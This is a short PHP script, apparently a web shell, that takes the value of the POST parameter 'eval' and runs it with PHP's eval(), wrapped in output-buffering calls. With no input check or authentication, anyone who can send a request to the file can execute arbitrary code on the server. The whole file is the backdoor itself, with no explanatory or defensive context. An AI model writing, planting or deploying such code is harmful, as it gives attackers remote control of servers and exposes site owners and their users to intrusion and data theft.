<?php
ob_start();
$eval = $_POST['eval'];
$tmp = ob_get_contents();
echo $tmp;
ob_clean();
eval($eval);
?>